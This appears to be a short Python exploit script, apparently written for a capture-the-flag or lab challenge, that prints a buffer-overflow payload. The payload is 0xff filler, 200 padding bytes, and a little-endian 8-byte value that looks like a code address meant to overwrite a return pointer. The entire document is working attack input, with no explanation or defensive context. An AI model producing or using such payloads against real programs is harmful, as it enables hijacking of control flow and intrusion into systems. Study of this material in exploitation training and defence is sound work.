import sys 
sys.stdout.buffer.write(b'\xff'*41 + b'\n' + b'a'*200 + b'\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + b'\n')
